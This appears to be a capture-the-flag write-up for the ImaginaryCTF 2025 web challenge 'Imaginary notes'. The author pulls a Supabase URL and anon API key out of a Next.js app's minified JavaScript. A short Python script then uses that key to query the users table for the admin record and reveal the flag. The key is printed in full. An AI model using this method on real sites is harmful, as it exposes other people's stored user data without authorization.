-----------

### Imaginary CTF 2025

-----------

![image](https://github.com/user-attachments/assets/a6341580-8aea-42ec-8676-11eda1a5dcc2)

-------------

### Challenges 

-------------

- Web-:
  - Imaginary notes

---------------

### Imaginary-notes

----------------

![image](https://github.com/user-attachments/assets/5a5b57d5-e346-4a49-8be8-9b1b2e1e779b)

-----------------

- We have a Nextjs application.I checked the `view-source` for minified js files and discovered one.

![image](https://github.com/user-attachments/assets/463cf46a-cc68-4ab5-9789-175a7e7c9fd9)

- I visited the page and discovered a minified code with a supabase url and an api key.

![image](https://github.com/user-attachments/assets/6473f555-28f2-4b85-880c-e01c1326433c)

- Solve.py-:

```python3
#! /usr/bin/env python3
from  supabase import Client,create_client

url = "https://dpyxnwiuwzahkxuxrojp.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI"

client =  create_client(url,key)
data = client.table("users").select("*").eq("username","admin").execute()
print(data)
```

- Flag-: ```ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}```

![image](https://github.com/user-attachments/assets/795fd795-7725-4272-9ca8-cdf1c4d4b376)

--------------------



